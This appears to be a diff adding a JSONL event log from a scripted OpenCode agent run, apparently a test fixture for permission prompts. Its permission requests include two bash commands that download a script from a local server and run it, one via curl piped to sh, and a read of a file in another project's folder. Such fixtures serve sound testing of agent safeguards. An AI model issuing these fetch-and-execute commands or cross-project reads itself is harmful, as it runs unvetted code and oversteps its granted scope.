@@ -1,0 +1,14 @@
+{"type":"run_queued","summary":"Agent run queued","sequence":1,"timestamp":"2026-10-06T15:50:43.450Z"}
+{"type":"run_started","summary":"Agent run started","sequence":2,"timestamp":"2026-10-06T15:50:43.484Z"}
+{"type":"session_created","summary":"OpenCode session created","data":{"sessionId":"x2a-session-1"},"sequence":3,"timestamp":"2026-10-06T15:50:43.486Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-normal","permission":"edit","sessionID":"x2a-session-1","metadata":{"filepath":"README.completed"}},"sequence":4,"timestamp":"2026-10-06T15:50:43.495Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-download-file","permission":"bash","sessionID":"x2a-session-1","metadata":{"command":"curl -s -o fetched.sh http://127.0.0.1:52775/x.sh && sh fetched.sh"}},"sequence":5,"timestamp":"2026-10-06T15:50:43.500Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-normal-read","permission":"read","sessionID":"x2a-session-1","metadata":{"filepath":"README.md"}},"sequence":6,"timestamp":"2026-10-06T15:50:45.541Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-cross-project-read","permission":"read","sessionID":"x2a-session-1","metadata":{"filepath":"../other-project/notes.md"}},"sequence":7,"timestamp":"2026-10-06T15:50:45.556Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-normal-fetch","permission":"webfetch","sessionID":"x2a-session-1","metadata":{"url":"http://127.0.0.1:52775/status"}},"sequence":8,"timestamp":"2026-10-06T15:50:45.557Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-normal-report","permission":"edit","sessionID":"x2a-session-1","metadata":{"filepath":"report.json"}},"sequence":9,"timestamp":"2026-10-06T15:50:45.560Z"}
+{"type":"opencode.permission.asked","data":{"id":"x2a-session-1-download-pipe","permission":"bash","sessionID":"x2a-session-1","metadata":{"command":"curl -s http://127.0.0.1:52775/x.sh | sh"}},"sequence":10,"timestamp":"2026-10-06T15:50:45.561Z"}
+{"type":"opencode.deterministic.completed","data":{"sessionID":"x2a-session-1"},"sequence":11,"timestamp":"2026-10-06T15:50:47.589Z"}
+{"type":"file_changes","summary":"3 files changed","data":{"files":[{"file":"fetched.sh","additions":1,"deletions":0,"status":"added"},{"file":"README.completed","additions":1,"deletions":0,"status":"added"},{"file":"report.json","additions":1,"deletions":0,"status":"added"}]},"sequence":12,"timestamp":"2026-10-06T15:50:47.599Z"}
+{"type":"assistant_message","summary":"deterministic script completed","data":{"text":"deterministic script completed"},"sequence":13,"timestamp":"2026-10-06T15:50:47.601Z"}
+{"type":"run_completed","summary":"Agent run completed","sequence":14,"timestamp":"2026-10-06T15:50:47.607Z"}
